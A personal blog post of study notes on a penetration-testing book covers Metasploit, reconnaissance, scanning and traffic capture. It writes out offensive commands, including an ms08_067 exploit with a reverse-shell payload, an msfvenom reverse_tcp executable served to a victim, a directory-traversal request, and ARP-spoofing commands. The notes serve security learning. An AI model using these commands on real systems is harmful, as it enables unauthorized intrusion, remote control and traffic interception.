---
title: "Penetration Testing: A Hands-on Introduction to Hacking"
date: 2018-11-25 11:31:25 -0400
categories: pentesting
tags: books
cover: /assets/images/books/penetration-testing/pentest-logo.png
---

`Currently reading`{:.info}

[Amazon Link](https://amzn.to/2LXKhC2)

![bookcover](/assets/images/books/penetration-testing/pentest-bookcover.jpg){:width="200px"}

### 3: Programming

* Bash

	* Need to learn more about bash scripting.

* Python

	* Need to learn more about network libraries that handle network sockets

* C
	
	* Definitely need to learn C. I have no idea how it works.

### 4: Metasploit framework

* Modular and flexible software to help developers to create and test vulnerabilities.

	* Shared exploit code can be shared and vetted by the security community for accuracy.

* Websites to search for exploits:

	* [packetstormsecurity.com](http://packetstormsecurity.com)
	
	* [securityfocus.com](http://securityfocus.com)

	* [exploit-db.com](http://exploit-db.com)

* Metasploit online database search:
	
	* [rapid7.com/db/modules](http://rapid7.com/db/modules)

* Metasploit requires the following services to run:

	```bash
	service postgresql start
	```
	
	```bash
	service metasploit start
	```

* Metasploit console:

	```bash
	msfconsole
	```

	* Searching for modules:

	```bash
	search ms08-067
	```

	* Information about module:

	```bash
	info exploit/windows/smb/ms08_067_netapi
	```

	* Use (load) exploit module:

	```bash
	use windows/smb/ms08_067_netapi
	```

	* Identify the parameters of the module:
		
	```bash
	show options
	```

	* Possible commands:

	```bash
	show targets
	```

	```bash
	set payload windows/shell_reverse_tcp
	```

	```bash
	set RHOST 192.168.0.1
	```

	* Show compatible payloads for the module:

	```bash
	show payloads
	```

	* Execute the exploit module:

	```bash
	exploit
	```

	* If exploit is successful, it will open a Meterpreter. That's metasploits unique payload.

* Type of shells:

	* Bind: instructs machine to open a command shell and listen on local port. The attack machine will then connect to the target machine.

	* Reverse: victim machine will actively try to connect to attack machine. More likely to bypass firewall as you can masquerade connections using port 80 and 443.

* Metasploit CLI:

	```bash
	msfcli
	```

	* It is similar to `msfconsole` but command can be written in a single line such as:

	```bash
	msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.1 PAYLOAD=windows/shell_bind_tcp E
	```

	* This command is broken down into:

	```bash
	msfcli windows/smb/ms08_67_netapi O
	```

	```bash
	msfcli windows/smb/ms08_67_netapi P
	```

* Creating standalone payloads using `msfvenom`

	* `msfvenom` allows you to build a standalone payloads to run on target system using social engineering or other nefarious methods

	* Choosing a payload:

	```bash
	msfvenom -l payloads
	```

	* Selecting payload:

	```bash
	msfvenom -p windows/meterpreter/reverse_tcp -o
	```

	* -o is to reveal options needed to complete the command

	* LHOST LPORT

	* Choosing output format:

	```bash
	msfvenom --help-formats
	```

	* Output ranges from .exe to python scripts

	* Complete payload command:

	```bash
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=12345 -f exe > chapter4example.exe
	```

	`file chapter4example.exe` - This command will show you the type of file it is

	* Serving payload:

		* Host payload on web server

		* Run payload on windows machine and you'll see the payload communicating back to handler (Kali)

* Using an auxiliary module

	* An auxiliary module is a module that isn't used for exploitation such as vulnerability scanners, fuzzers, and DoS

		* Exploit modules use payload and auxiliary does not.

		* Auxiliary modules can target multiple hosts (RHOSTS vs RHOST)

* Updating Metasploit:

	```bash
	msfupdate
	```

### 5: Information Gathering

* Open source intelligence gathering (OSINT)

	* Netcraft

		* IP addresses, server type for hosting, crafting phishing emails that looks like service provider

	* Commands to help gather information:

		* `nslookup`

		* Zone transfer vulnerabilities

			```bash
			host -t ns domain.com
			```

			```bash
			host -l zoneedit.com ns2.zoneedit.com
			```

			* This command will reveal subdomains that will give you a good start on where to look for possible vulnerabilities

	* Harvest possible email addresses based on domain

		* `theHarvester` - python tool

		```bash
		theharvester -d bulbsecurity.com -l 500 -b all
		```

	* Data mining tool to visualize gathered intelligence

		* Maltego - [http://www.paterva.com](http://www.paterva.com)

		* GUI tool (paid/free versions)

	* Port scanning

	```bash
	nc -vv 192.168.0.1 25
	```

	```bash
	nmap -sS 192.168.0.1-3 -oA report
	```

	* syn scan - a TCP scan that doesn't complete the TCP 3-way handshake. Stealthy way to port scan a machine.

	```bash
	nmap -sV 192.168.0.1-3 -oA report
	```

	* a version scan

	* This nmap scan completes the connection then determines what software is running

	* Sometimes this can cause the service to crash

	```bash
	nmap -sU 192.168.0.1-3 -oA report
	```

	* UDP scan

	```bash
	nmap -sS -p 3232 192.168.0.1
	```

	* Scan a specific port

### 6: Finding vulnerabilities

* Don't fully rely on automated exploitation tools, a skilled pentester will yield better results if you can carefully study the vulnerabilities

	* Nessus

		* Vulnerability scanner (free/paid versions)

		```bash
		service nessusd start
		```

		```bash
		https://kali:8834
		```

		* It's basically a GUI tool that you can setup policies to scan network ranges for machines with vulnerabilities

		* Be aware this tool isn't stealthy if that is what you are aiming for

		* The great part about this tool is exporting a tidy report in multiple formats

			* Don't stop here though, you need to verify the results and combine them with manual analysis to get the complete picture of the environment

		* Researching vulnerabilities

			* [http://www.securityfocus.com](http://www.securityfocus.com)

			* [http://www.packetstormsecurity.org](http://www.securityfocus.com)

			* [http://www.exploit-db.org](http://www.securityfocus.com)

			* [http://www.cve.mitre.org](http://www.securityfocus.com)

	* Nmap Scripting Engine (NME)

		* `/usr/share/nmap/scripts`

		```bash
		nmap -sC 192.168.0.1-3
		```

		* The `-sC` switch will run the default nmap scripts

	* Running a single NSE script

		```bash
		nmap --script-help nfs-ls
		```

		```bash
		nmap --script=nfs-ls 192.168.0.1
		```

	* Metasploit exploit check functions

		```bash
		use windows/smb/ms08_067_netapi
		set RHOST 192.168.0.1
		check
		```

		* Not all modules has check vulnerability option

	* Web application scanning

		* Nikto

			* Scans web services for outdated versions, vulnerabilities, and misconfigurations
			
			```bash
			nikto -h 192.168.0.1
			```
	
		* Open source vulnerability repository

			* [http://osvdb.com](http://osvdb.com)

		* Cadaver
			
			* A tool to access WebDAV services

			```bash
			cadaver http://192.168.0.1/webdav
			```

	* Manual Analysis

		* Exploring a strange port

		* When trying to scan a port with Nmap and you notice the service crashes, this behaviour suggest that listening port has difficulty with processing the input than expected

		```bash
		nc 192.168.0.1 3232
		```

		* netcat will tell us what the software is used for hosting the web server
		
		```bash
		GET / HTTP/1.1
		GET /../../../../../boot.ini HTTP/1.1
		```

		```bash
		nc 192.168.0.1 25
		```

		* VRFY - A way to verify if a username is valid or not for mail servers

### 7: Capturing Traffic

`Work in progress`{:.warning }

* Networking for capturing traffic
	
	* To simulate non-virtualized network, turn off Promiscuous mode on all interfaces in Wireshark

* Using Wireshark

	* Capturing network traffic - `wireshark`

	* Filter traffic

		* Use the filter function in wireshark and filter by protocol or service

	* Following a TCP stream

		* When you find an interesting packet in the time frame, you can right click on the packet and select `Follow TCP Stream`

	* Dissecting packets

		* You can dissect packets into HEX format (RAW bytes) by selecting the packet description

	* ARP Cache Poisoning (ARP Spoofing)

		* Used for masquerading as another device on the network

		* ARP in a nutshell

			1. Client machine sends out a packet that says who has 192.168.20.10?

			2. The machine with that specific address replies back with "it's me and here is my MAC address".
			
			3. The client machine stores the response and caches it into local ARP table ARP Cache Poisoning

			![ARP Nutshell](/assets/images/books/penetration-testing/pentest-arp-cache-poisoning.png)

* IP Forwarding

	* To perform a MitM attack, you already have the ARP responses from both client and server by triggering responses (connecting to service)

	```bash
	echo 1 > /proc/sys/net/ipv4/ip_forward
	```

* ARP Cache poisoning

	```bash
	arpspoof -i eth0 ip-to-fool ip-to-pretend
	```

	```bash
	arp -a
	```

	You can also arpspoof the gateway as well but users may notice sluggish performance issues

* DNS Cache poisoning